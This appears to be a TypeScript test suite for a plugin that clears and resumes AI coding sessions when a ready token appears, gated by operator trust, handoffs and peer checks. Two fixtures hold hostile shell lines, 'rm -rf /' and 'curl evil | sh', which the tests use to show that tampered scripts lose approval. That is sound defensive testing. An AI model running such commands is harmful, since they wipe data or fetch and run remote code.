function autoConfig(restart: Record<string, unknown> = {}, handoff: Record<string, unknown> = {}) {
  return {
    version: 1,
    roles: {
      lead: {
        triggers: [{ id: 'soft', when: { context: '300k' }, do: ['note'], level: 'soft' }],
        handoff: { instructions: 'Sections: Goal, State, Next action.', ...handoff },
        restart: { mode: 'auto', prompt: 'Carry on.', peers: ['reviewer'], peerGap: '10m', ...restart },
      },
      reviewer: {},
    },
  }
}

function restartWorld(over: Partial<World> = {}): World {
  return newWorld({ commands: RESTART_COMMANDS, ...over })
}

// A handoff written a minute after the session start.
async function writeHandoff(w: World, clock: MockClock, path = HANDOFF): Promise<void> {
  await clock.advance(MIN)
  w.files[path] = { text: '# handoff\n', mtimeMs: clock.now() }
}

type Task = { id: string; type: string; status: string; description: string }

// The main turn's end as the engine raises it: its Stop (with what is in flight), then turn.complete.
async function ready($: Engine, clock: MockClock, answer = 'Handoff written.\n\nCTX-READY', background: Task[] | 'none' = []): Promise<void> {
  await $.classic.Stop(background === 'none' ? { stop_hook_active: false } : { stop_hook_active: false, background_tasks: background })
  await $.turn.complete({ answer, durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.settle()
  // The race's settle period after the stamp is written.
  await clock.advance(RACE_SETTLE_MS)
}

const refusals = (s: MockSession): string[] => notes(s).filter(n => n.includes('CTX-READY ignored'))

// A trusted lead with a fresh handoff: everything a restart needs.
async function armed($: Engine, on: On, w: World, config: unknown = autoConfig()): Promise<{ clock: MockClock; session: MockSession }> {
  writeConfig(w, config)
  const env = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  expect(await ctxGuard($, 'trust')).toContain('approved for /repo')
  await writeHandoff(w, env.clock)
  return env
}

const PEEK_RESTART: Plugin = {
  name: 'peek-restart',
  register: on => {
    on('command.run', { command: 'peek-restart' }, async $ => {
      const pendingResume = (await $.state.get({ plugin: 'ctx-guard', key: 'pendingResume' })).value ?? null
      const lastVerdict = (await $.state.get({ plugin: 'ctx-guard', key: 'lastVerdict' })).value ?? null
      const band = (await $.state.get({ plugin: 'ctx-guard', key: 'band' })).value ?? null
      return { text: JSON.stringify({ pendingResume, lastVerdict, band }) }
    })
  },
}

async function peekRestart($: Engine): Promise<{ pendingResume: { step: string } | null; lastVerdict: { code: string } | null; band: { restartFailed: string | null } | null }> {
  const r = await $.command.run({ command: 'peek-restart', args: '', origin: { kind: 'composer' } as never, presentation: { isFullscreen: false, columns: 120 } })
  return JSON.parse(r.text ?? 'null')
}

test('a trusted ready token: pendingResume, then /clear, then the resume, then cleared', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ hang: { clear: 1000, 'ctx-guard:resume': 1000 } })
  const { clock, session } = await armed($, on, w)
  await ready($, clock)
  expect(w.ran).toEqual(['clear'])
  expect((await peekRestart($)).pendingResume?.step).toBe('clear')
  await clock.advance(1000)
  expect(w.ran).toEqual(['clear', RESUME])
  expect((await peekRestart($)).pendingResume?.step).toBe('sent')
  await clock.advance(1000)
  expect(refusals(session)).toEqual([])
  const after = await peekRestart($)
  expect(after.pendingResume).toBeNull()
  expect(after.lastVerdict?.code).toBe('ok')
  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}')).toEqual({ owner: 's1', at: clock.now() - RACE_SETTLE_MS - 2000 })
  expect(await ctxGuard($, '')).toContain('last verdict: ok')
})

test('a ready token mid-line or on an earlier line does nothing', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  await ready($, clock, 'I will end with CTX-READY once done.')
  await ready($, clock, 'CTX-READY\nnot yet')
  expect(w.ran).toEqual([])
  expect(refusals(session)).toEqual([])
  await ready($, clock, 'Done.\n`CTX-READY`.')
  expect(w.ran).toEqual(['clear', RESUME])
})

test('a subagent answer or an interrupted turn ending on the token does nothing', async ($, on) => {
  const w = restartWorld()
  const { clock } = await armed($, on, w)
  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer', agentId: 'sub-1' })
  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: true, turnId: 't1', reason: 'aborted' })
  await clock.settle()
  expect(w.ran).toEqual([])
})

test('manual mode never clears', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w, autoConfig({ mode: 'manual' }))
  await ready($, clock)
  expect(w.ran).toEqual([])
  expect(refusals(session)).toEqual([])
})

test('autoActions off never clears', { options: { autoActions: false } }, async ($, on) => {
  const w = restartWorld()
  const { clock } = await armed($, on, w)
  await ready($, clock)
  expect(w.ran).toEqual([])
})

test('a pause holds the restart back', async ($, on) => {
  const w = restartWorld()
  const { clock } = await armed($, on, w)
  await ctxGuard($, 'pause 10m')
  await ready($, clock)
  expect(w.ran).toEqual([])
})

test('untrusted: refused, never clears, never runs a ready check; the note asks for the operator', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await writeHandoff(w, clock)
  await measure($, w, 310_000)
  expect(notes(session)[0]).toContain("tell the operator 'ready for /clear'")
  await ready($, clock)
  expect(w.ran).toEqual([])
  expect(w.processes).toEqual([])
  expect(refusals(session)[0]).toContain('CTX-READY ignored (untrusted)')
  expect(refusals(session)[0]).toContain('Nothing was cleared.')
  const report = await ctxGuard($, '')
  expect(report).toContain('trust: not approved (needs approval: *.readyToken, *.stateDir, lead.compact, lead.compactTriggers, lead.handoff, lead.restart')
  expect(report).toContain('last verdict: untrusted')
  expect(await ctxGuard($, 'check')).toContain('--   ready-check-failed: not run: the repo is not trusted')
  expect(w.processes).toEqual([])
})

test('trust is the operator\'s, and any change to a trusted field withdraws it', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  expect(await ctxGuard($, 'trust', 'plugin')).toContain('only the operator can run /ctx-guard trust')
  expect(await ctxGuard($, '')).toContain('trust: approved')
  await clock.advance(1000)
  writeConfig(w, autoConfig({ readyChecks: [{ run: ['./other.sh'] }] }))
  await measure($, w, 100_000)
  expect(await ctxGuard($, '')).toContain('trust: not approved (needs approval: lead.restart)')
  await ready($, clock)
  expect(w.ran).toEqual([])
  expect(refusals(session)[0]).toContain('(untrusted)')
  // A change outside the trusted fields keeps it.
  await ctxGuard($, 'trust')
  await clock.advance(1000)
  writeConfig(w, { ...autoConfig({ readyChecks: [{ run: ['./other.sh'] }] }), readyToken: 'CTX-READY' })
  await measure($, w, 100_000)
  expect(await ctxGuard($, '')).toContain('trust: approved')
})

test('already-busy: a second token while the restart runs', async ($, on) => {
  const w = restartWorld({ hang: { clear: 30_000 } })
  const { clock, session } = await armed($, on, w)
  await ready($, clock)
  await ready($, clock)
  expect(refusals(session).map(r => r.includes('(already-busy)'))).toEqual([true])
  await clock.advance(30_000)
  expect(w.ran).toEqual(['clear', RESUME])
})

test('no-restart-command', async ($, on) => {
  const w = restartWorld({ commands: [{ name: 'clear', source: 'builtin' }] })
  const { clock, session } = await armed($, on, w)
  await ready($, clock)
  expect(refusals(session)[0]).toContain("(no-restart-command): /ctx-guard:resume is not among the session's commands")
  expect(w.ran).toEqual([])
})

test('agents-running: a listed agent', async ($, on) => {
  const w = restartWorld({ agents: [{ id: 'a1', status: 'running', description: 'review the diff', type: 'general-purpose' }] })
  const { clock, session } = await armed($, on, w)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(agents-running): agents still running: review the diff')
  expect(w.ran).toEqual([])
})

test('agents-running: an unlisted agent seen stepping, until its turn completes', async ($, on) => {
  const w = restartWorld()
  stepBottom(on, () => 20_000)
  const { clock, session } = await armed($, on, w)
  await step($, clock, 'wf-1')
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(agents-running): agents still running: agent wf-1 (stepped recently)')
  await $.turn.complete({ answer: 'report', durationMs: 1, isAborted: false, turnId: 't2', reason: 'answer', agentId: 'wf-1' })
  await ready($, clock)
  expect(w.ran).toEqual(['clear', RESUME])
})

test('background-tasks from the last Stop', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  await ready($, clock, undefined, [{ id: 'b1', type: 'shell', status: 'running', description: 'npm run watch' }])
  expect(refusals(session)[0]).toContain('(background-tasks): background tasks still running: npm run watch')
  // A Stop with no list is unknown, not empty.
  await ready($, clock, undefined, 'none')
  expect(refusals(session)[1]).toContain('(background-tasks): background tasks unknown')
  await ready($, clock)
  expect(w.ran).toEqual(['clear', RESUME])
})

test('role-shared: another live session holds the lease; one warning toast', async ($, on) => {
  const w = restartWorld()
  w.files[`${STATE}/lead.owner`] = { text: JSON.stringify({ sessionId: 'other', heartbeat: NOW }), mtimeMs: NOW }
  const { clock, session } = await armed($, on, w)
  await measure($, w, 100_000)
  await clock.advance(6 * MIN)
  await measure($, w, 100_000)
  expect(w.toasts.filter(t => t.includes('another live session (other) holds role "lead"')).length).toBe(1)
  expect(JSON.parse(w.files[`${STATE}/lead.owner`]?.text ?? '{}').sessionId).toBe('other')
  await writeHandoff(w, clock)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(role-shared): another live session (other) holds role')
  expect(await ctxGuard($, '')).toContain('lease: held by another live session (other')
  expect(w.ran).toEqual([])
})

test('the lease: written on start, beaten by the band timer and on measure, released at the end but not on /clear', async ($, on) => {
  const w = restartWorld()
  const { clock } = await armed($, on, w)
  const owner = () => JSON.parse(w.files[`${STATE}/lead.owner`]?.text ?? '{}')
  expect(owner()).toEqual({ sessionId: 's1', heartbeat: NOW })
  // No measure at all: the 5-minute band timer beats.
  await clock.advance(4 * MIN)
  expect(owner().heartbeat).toBe(NOW + 5 * MIN)
  await clock.advance(5 * MIN)
  await measure($, w, 100_000)
  expect(owner().heartbeat).toBe(NOW + 10 * MIN)
  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
  expect(owner().heartbeat).toBe(clock.now())
  expect(await ctxGuard($, '')).toContain('lease: held by this session')
  await $.session.end({ reason: 'prompt_input_exit', sessionId: 's2', resume: {} as never })
  expect(owner().heartbeat).toBe(0)
})

test('no-handoff', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, autoConfig())
  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await ctxGuard($, 'trust')
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(no-handoff): .ctx-guard/lead-handoff.md does not exist')
})

test('handoff-stale: written before the session start, or before the last /clear', async ($, on) => {
  const w = restartWorld()
  w.files[HANDOFF] = { text: '# old\n', mtimeMs: NOW - 1 }
  writeConfig(w, autoConfig())
  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  await ctxGuard($, 'trust')
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(handoff-stale)')
  await writeHandoff(w, clock)
  await clock.advance(MIN)
  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
  await ready($, clock)
  expect(refusals(session)[1]).toContain('(handoff-stale)')
  expect(w.ran).toEqual([])
})

test('stamp-unreadable', async ($, on) => {
  const w = restartWorld()
  w.files[`${STATE}/reviewer.restart`] = { text: 'garbage', mtimeMs: NOW }
  const { clock, session } = await armed($, on, w)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(stamp-unreadable): the restart stamp of reviewer cannot be read')
})

test('peer-restarting: a peer stamp younger than peerGap', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'other', at: clock.now() - 4 * MIN }), mtimeMs: NOW }
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(peer-restarting): the reviewer session restarted 4m ago, under peerGap 10m')
  await clock.advance(6 * MIN)
  await writeHandoff(w, clock)
  await ready($, clock)
  expect(w.ran).toEqual(['clear', RESUME])
})

test('ready-check-failed: a non-zero exit or a timeout; exit 0 passes', async ($, on) => {
  const w = restartWorld({ exitCode: 3 })
  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh', '--strict'], timeout: '10s' }] }))
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(ready-check-failed): ./ready.sh --strict: exited 3')
  w.exitCode = 'timeout'
  await ready($, clock)
  expect(refusals(session)[1]).toContain('(ready-check-failed): ./ready.sh --strict: did not finish within 10s')
  w.exitCode = 0
  await ready($, clock)
  expect(w.processes).toEqual([
    ['./ready.sh', '--strict'],
    ['./ready.sh', '--strict'],
    ['./ready.sh', '--strict'],
  ])
  expect(w.ran).toEqual(['clear', RESUME])
})

test('race-lost: a peer stamp written first; the own stamp is put back', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  w.onWrite = path => {
    if (path !== `${STATE}/lead.restart` || w.files[`${STATE}/reviewer.restart`]) return
    w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'other', at: clock.now() - 1 }), mtimeMs: clock.now() }
  }
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(race-lost): the reviewer session started its restart first')
  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(0)
  expect(w.ran).toEqual([])
})

test('error: a handoff that is a symlink out of the root', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  w.links[HANDOFF] = '/elsewhere/secret.md'
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(error): handoff path .ctx-guard/lead-handoff.md resolves outside the project root')
  expect(w.ran).toEqual([])
})

test('error: a state folder that is a symlink out of the root', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  w.links[STATE] = '/tmp/elsewhere'
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(error): stateDir .ctx-guard resolves outside the project root')
  expect(w.ran).toEqual([])
})

test('error: /clear refused puts the stamp back and clears pendingResume', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ failCommand: 'clear' })
  const { clock, session } = await armed($, on, w)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(error): /clear was refused')
  expect((await peekRestart($)).pendingResume).toBeNull()
  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(0)
})

test('a resume that fails after /clear flags the band', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ failCommand: 'ctx-guard:resume' })
  writeConfig(w, autoConfig())
  const { clock } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($, 'vscode')
  await ctxGuard($, 'trust')
  await writeHandoff(w, clock)
  await ready($, clock)
  expect(w.ran).toEqual(['clear', RESUME])
  const failed = 'restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md'
  expect((await peekRestart($)).band?.restartFailed).toBe(failed)
  expect(w.statuses.at(-1)).toContain(failed)
  expect((await peekRestart($)).pendingResume).toBeNull()
  // Typing the resume by hand clears the flag.
  w.failCommand = null
  await $.command.run({ command: 'ctx-guard:resume', args: 'role=lead handoff=.ctx-guard/lead-handoff.md', origin: { kind: 'composer' } as never, presentation: { isFullscreen: false, columns: 120 } })
  expect((await peekRestart($)).band?.restartFailed).toBeNull()
})

test('a reload during /clear: the next session start finishes the resume once', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ hang: { clear: 60_000 } })
  const { clock } = await armed($, on, w)
  await ready($, clock)
  expect((await peekRestart($)).pendingResume?.step).toBe('clear')
  // The clear goes through, then the module reloads before the old timer resumes.
  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
  await start($)
  await clock.settle()
  expect(w.ran).toEqual(['clear', RESUME])
  expect((await peekRestart($)).pendingResume).toBeNull()
  await clock.advance(60_000)
  expect(w.ran).toEqual(['clear', RESUME])
})

test('a pending resume too old to finish is dropped and flagged', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ hang: { clear: 60 * MIN } })
  const { clock } = await armed($, on, w)
  await ready($, clock)
  await $.session.end({ reason: 'clear', sessionId: 's1', resume: {} as never })
  await clock.advance(6 * MIN)
  await start($)
  await clock.settle()
  expect(w.ran).toEqual(['clear'])
  const after = await peekRestart($)
  expect(after.pendingResume).toBeNull()
  expect(after.band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
  expect(w.toasts.some(t => t.includes('too old to finish'))).toBe(true)
})

test('a pending resume whose /clear never ran is dropped: nothing was cleared', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ hang: { clear: 60 * MIN } })
  const { clock } = await armed($, on, w)
  await ready($, clock)
  await start($)
  await clock.settle()
  expect(w.ran).toEqual(['clear'])
  expect((await peekRestart($)).pendingResume).toBeNull()
  expect(w.toasts.some(t => t.includes('nothing was cleared'))).toBe(true)
})

test('session-handoff style: the newest file under the role slug is the handoff', async ($, on) => {
  const w = restartWorld()
  const dir = `${ROOT}/.claude/session-handoffs/ctx-guard-lead`
  const { clock, session } = await armed($, on, w, autoConfig({}, { style: 'session-handoff' }))
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(no-handoff): .claude/session-handoffs/ctx-guard-lead/*.md does not exist')
  w.files[`${dir}/20261013-1100-aaaa.md`] = { text: '#', mtimeMs: clock.now() + 1 }
  w.files[`${dir}/20261013-1105-bbbb.md`] = { text: '#', mtimeMs: clock.now() + 2 }
  await clock.advance(1000)
  await measure($, w, 310_000)
  expect(notes(session).at(-1)).toContain(
    'with the session-handoff skill: Sections: Goal, State, Next action. Use the project slug `ctx-guard-lead` and run its handoff tool from the project root.',
  )
  await ready($, clock)
  expect(w.ran).toEqual(['clear', 'ctx-guard:resume role=lead handoff=.claude/session-handoffs/ctx-guard-lead/20261013-1105-bbbb.md Carry on.'])
})

test('/ctx-guard check: each check, a dry run that writes, races and clears nothing', async ($, on) => {
  const w = restartWorld()
  const { clock } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
  const files = Object.keys(w.files).sort()
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  expect(await ctxGuard($, 'check', 'plugin')).toContain('only the operator can run /ctx-guard check')
  expect(w.processes).toEqual([])
  const ok = await ctxGuard($, 'check')
  expect(ok).toContain('ctx-guard check (dry run, role lead, via clear; nothing written or cleared):')
  expect(ok).toContain('ok   untrusted: repo trusted')
  expect(ok).toContain('ok   no-handoff: .ctx-guard/lead-handoff.md found')
  expect(ok).toContain('ok   ready-check-failed: 1 ready check passed')
  expect(ok).toContain('--   race-lost: judged after the stamp is written')
  expect(ok).toContain('verdict: would restart')
  expect(w.processes).toEqual([['./ready.sh']])
  expect(w.ran).toEqual([])
  expect(Object.keys(w.files).sort()).toEqual(files)
  w.agents = [{ id: 'a1', status: 'waiting', description: 'scan', type: 'Explore' }]
  delete w.files[HANDOFF]
  const refused = await ctxGuard($, 'check')
  expect(refused).toContain('FAIL agents-running: agents still running: scan')
  expect(refused).toContain('FAIL no-handoff: .ctx-guard/lead-handoff.md does not exist')
  expect(refused).toContain('verdict: refused (agents-running)')
  await clock.settle()
  expect(w.ran).toEqual([])
})

test('/ctx-guard check with no role, and in manual mode', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, autoConfig({ mode: 'manual' }))
  world(on, w)
  await start($)
  expect(await ctxGuard($, 'check')).toBe('ctx-guard check: no role, so no restart to check')
  await ctxGuard($, 'role lead')
  expect(await ctxGuard($, 'check')).toContain('note: the ready token is not acted on now (restart mode is manual)')
})

test('a typed resume claims its role for a session with none; a different held role is refused', async ($, on) => {
  const w = restartWorld()
  writeConfig(w, autoConfig())
  world(on, w)
  await start($)
  const run = (args: string, kind: 'composer' | 'plugin' = 'composer') =>
    $.command.run({ command: 'ctx-guard:resume', args, origin: { kind } as never, presentation: { isFullscreen: false, columns: 120 } })
  await run('role=lead handoff=.ctx-guard/lead-handoff.md Carry on.')
  expect(w.ran).toEqual(['ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md Carry on.'])
  expect(await ctxGuard($, '')).toContain('role: lead (from /ctx-guard:resume)')
  const refused = await run('role=reviewer handoff=x.md')
  expect(refused.text).toContain('/ctx-guard:resume refused: this session holds role "lead"')
  expect(w.ran.length).toBe(1)
  // Not typed by the person: no claim and no refusal.
  await run('role=reviewer handoff=x.md', 'plugin')
  expect(w.ran.length).toBe(2)
  expect(await ctxGuard($, '')).toContain('role: lead (from /ctx-guard:resume)')
  expect((await run('role=Bad!')).text).toContain('bad arguments')
  expect((await run('role=ghost')).text).toContain('refused')
})

test('the report shows trust, the last verdict, the handoff age and the lease owner', async ($, on) => {
  const w = restartWorld()
  const { clock } = await armed($, on, w)
  await clock.advance(2 * MIN)
  const report = await ctxGuard($, '')
  expect(report).toContain('trust: approved 3m ago')
  expect(report).toContain('last verdict: none')
  expect(report).toContain('handoff: .ctx-guard/lead-handoff.md, written 2m ago')
  expect(report).toContain('lease: held by this session, heartbeat 3m ago')
  expect(report).toContain('restart: auto')
})

// ---- restart: review follow-ups -------------------------------------------------

async function tokenTurn($: Engine, clock: MockClock): Promise<void> {
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [] })
  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.settle()
}

test('a turn started between the token and /clear refuses, and the stamp is put back', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  await tokenTurn($, clock)
  // The flow waits out the race's settle period; the person types meanwhile.
  await $.turn.start({ text: 'one more thing', turnId: 't2' })
  await clock.advance(RACE_SETTLE_MS)
  expect(refusals(session)[0]).toContain('(already-busy): a turn started after the ready token')
  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(0)
  expect(w.ran).toEqual([])
})

test('a whole turn run between the token and /clear refuses', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  await tokenTurn($, clock)
  await clock.advance(500)
  await $.turn.start({ text: 'status?', turnId: 't2' })
  await $.turn.complete({ answer: 'All good.', durationMs: 1, isAborted: false, turnId: 't2', reason: 'answer' })
  await clock.advance(RACE_SETTLE_MS)
  expect(refusals(session)[0]).toContain('(already-busy): another turn ran after the ready token')
  expect(w.ran).toEqual([])
})

test('an agent started during the ready checks refuses at the re-check', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
  w.onProcess = () => {
    w.agents = [{ id: 'a9', status: 'running', description: 'late dispatch', type: 'Explore' }]
  }
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(agents-running): agents still running: late dispatch (started after the checks)')
  expect(w.ran).toEqual([])
})

test('race: a peer that wrote its stamp while our checks ran wins; we put ours back', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }] }))
  // The peer passed its own checks first and wrote its stamp before ours.
  w.onProcess = () => {
    w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'peer', at: clock.now() }), mtimeMs: clock.now() }
  }
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(race-lost): the reviewer session started its restart first')
  expect(w.ran).toEqual([])
})

test('race: a peer stamp newer than ours that lands in the settle period loses to us', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  w.onWrite = path => {
    if (path !== `${STATE}/lead.restart` || w.files[`${STATE}/reviewer.restart`]) return
    w.files[`${STATE}/reviewer.restart`] = { text: JSON.stringify({ owner: 'peer', at: clock.now() + 700 }), mtimeMs: clock.now() }
  }
  await ready($, clock)
  expect(refusals(session)).toEqual([])
  expect(w.ran).toEqual(['clear', RESUME])
})

test('busy work survives a reload: a running background task and a stepping agent still refuse', async ($, on) => {
  const w = restartWorld()
  stepBottom(on, () => 20_000)
  const { clock, session } = await armed($, on, w)
  await step($, clock, 'wf-1')
  await $.classic.Stop({ stop_hook_active: false, background_tasks: [{ id: 'b1', type: 'shell', status: 'running', description: 'npm run watch' }] })
  await start($)
  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.settle()
  expect(refusals(session)[0]).toContain('(agents-running): agents still running: agent wf-1 (stepped recently)')
  await $.turn.complete({ answer: 'report', durationMs: 1, isAborted: false, turnId: 't2', reason: 'answer', agentId: 'wf-1' })
  await start($)
  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.settle()
  expect(refusals(session)[1]).toContain('(background-tasks): background tasks still running: npm run watch')
  expect(w.ran).toEqual([])
})

test('background tasks never reported are unknown: refused', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  await $.turn.complete({ answer: 'CTX-READY', durationMs: 1, isAborted: false, turnId: 't1', reason: 'answer' })
  await clock.settle()
  expect(refusals(session)[0]).toContain('(background-tasks): background tasks unknown')
})

test('error: a missing handoff whose parent folder is a symlink out of the root', async ($, on) => {
  const w = restartWorld()
  w.links[`${ROOT}/notes`] = '/elsewhere/notes'
  const { clock, session } = await armed($, on, w, autoConfig({}, { path: 'notes/{role}.md' }))
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(error): handoff path notes/lead.md resolves outside the project root')
})

test('no-handoff: an empty handoff file does not count', async ($, on) => {
  const w = restartWorld()
  const { clock, session } = await armed($, on, w)
  w.files[HANDOFF] = { text: '', mtimeMs: clock.now() }
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(no-handoff): .ctx-guard/lead-handoff.md is empty')
})

test('a garbage owner file counts as free and is taken over', async ($, on) => {
  const w = restartWorld()
  w.files[`${STATE}/lead.owner`] = { text: 'not json', mtimeMs: NOW }
  const { clock, session } = await armed($, on, w)
  expect(JSON.parse(w.files[`${STATE}/lead.owner`]?.text ?? '{}').sessionId).toBe('s1')
  expect(w.toasts.some(t => t.includes('another live session'))).toBe(false)
  await ready($, clock)
  expect(refusals(session)).toEqual([])
  expect(w.ran).toEqual(['clear', RESUME])
})

test('a reload while the resume is being sent flags the band and never sends it twice', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld({ hang: { 'ctx-guard:resume': 60_000 } })
  const { clock } = await armed($, on, w)
  await ready($, clock)
  expect(w.ran).toEqual(['clear', RESUME])
  expect((await peekRestart($)).pendingResume?.step).toBe('sent')
  await start($)
  await clock.settle()
  const after = await peekRestart($)
  expect(after.pendingResume).toBeNull()
  expect(after.band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
  await clock.advance(60_000)
  expect(w.ran).toEqual(['clear', RESUME])
  expect((await peekRestart($)).band?.restartFailed).toBe('restart failed — type /ctx-guard:resume role=lead handoff=.ctx-guard/lead-handoff.md')
})

test('trust reads the files again and prints every approved field; a script under the root is hashed', async ($, on) => {
  const w = restartWorld()
  w.files[`${ROOT}/ready.sh`] = { text: '#!/bin/sh\ngit diff --quiet\n', mtimeMs: NOW }
  writeConfig(w, autoConfig({ readyChecks: [{ run: ['./ready.sh'] }, { run: ['git', 'diff', '--quiet'] }] }))
  const { clock, session } = world(on, w, { CTX_GUARD_ROLE: 'lead' })
  await start($)
  // Edited on disk with no measure since: trust approves what the file holds now.
  await clock.advance(1000)
  writeConfig(w, autoConfig({ prompt: 'Go on.', readyChecks: [{ run: ['./ready.sh'] }, { run: ['git', 'diff', '--quiet'] }] }))
  const text = await ctxGuard($, 'trust')
  for (const want of [
    'all roles: readyToken "CTX-READY", stateDir ".ctx-guard"',
    'restart: mode auto, via clear, command /ctx-guard:resume, prompt "Go on.", peers ["reviewer"], peerGap 10m',
    'ready check: ["./ready.sh"], timeout 30s (content hashed: ./ready.sh)',
    'ready check: ["git","diff","--quiet"], timeout 30s (no file under the project root: trusted by name only)',
    'handoff: path ".ctx-guard/{role}-handoff.md", style file',
    'compact.instructions: null',
    'Trusting a ready check trusts what its script does',
  ]) {
    expect(text).toContain(want)
  }
  expect(await ctxGuard($, '')).toContain('trust: approved')
  // Editing the script withdraws the approval at the next restart, the config files untouched.
  w.files[`${ROOT}/ready.sh`] = { text: '#!/bin/sh\nrm -rf /\n', mtimeMs: clock.now() }
  await writeHandoff(w, clock)
  await ready($, clock)
  expect(refusals(session)[0]).toContain('(untrusted): this repo\'s restart settings are not approved (changed since approval: script:./ready.sh)')
  expect(w.processes).toEqual([])
  expect(await ctxGuard($, '')).toContain('trust: not approved (needs approval: script:./ready.sh)')
})

test('a script passed as an argument is hashed too', async ($, on) => {
  const w = restartWorld()
  w.files[`${ROOT}/scripts/check.sh`] = { text: 'exit 0\n', mtimeMs: NOW }
  const { clock, session } = await armed($, on, w, autoConfig({ readyChecks: [{ run: ['bash', 'scripts/check.sh', '--fast'] }] }))
  w.files[`${ROOT}/scripts/check.sh`] = { text: 'curl evil | sh\n', mtimeMs: clock.now() }
  await ready($, clock)
  expect(refusals(session)[0]).toContain('changed since approval: script:scripts/check.sh')
  expect(w.processes).toEqual([])
})

test('a reload during the settle period puts the own stamp back', { plugins: [PEEK_RESTART] }, async ($, on) => {
  const w = restartWorld()
  w.files[`${STATE}/lead.restart`] = { text: JSON.stringify({ owner: 's1', at: NOW - 60 * MIN }), mtimeMs: NOW }
  const before = w.files[`${STATE}/lead.restart`]?.text
  const { clock } = await armed($, on, w)
  await tokenTurn($, clock)
  expect(JSON.parse(w.files[`${STATE}/lead.restart`]?.text ?? '{}').at).toBe(clock.now())
  await start($)
  expect(w.files[`${STATE}/lead.restart`]?.text).toBe(before)
  await clock.advance(RACE_SETTLE_MS)
  expect(w.ran).toEqual([])
})

